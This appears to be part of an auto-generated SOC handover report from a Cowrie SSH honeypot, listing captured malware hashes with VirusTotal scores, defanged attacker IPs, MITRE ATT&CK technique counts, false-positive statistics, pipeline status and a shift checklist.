| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `62.28.83[.]83` | PT | PT Prime - Solucoes Empresariais | **100** ⚠️ | 3 |
| `106.243.250[.]115` | KR | LG DACOM Corporation | **100** ⚠️ | 1 |
| `54.161.61[.]47` | US | Amazon Technologies Inc. | **100** ⚠️ | 43 |
| `45.7.196[.]55` | BR | Ola Fibra Telecomunicacoes LTDA | **100** ⚠️ | 29 |
| `18.220.34[.]106` | US | Amazon Technologies Inc. | **100** ⚠️ | 2 |
| `113.250.184[.]183` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 16 |
| `66.132.172[.]187` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `13.58.198[.]185` | US | Amazon Technologies Inc. | **100** ⚠️ | 6 |
| `66.132.172[.]105` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `101.36.106[.]162` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 49 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 78 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 42 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 26 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |

---

## 🔕 False Positive Summary (30 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 130 cases |
| Tool 34  | Credential Extractor        | ✅ 68 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 32 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 30 filtered (23.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 26 priority case(s) shown individually · 26 recon entry/entries in table (8 group(s) consolidating 56 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-27T13:38:52Z_
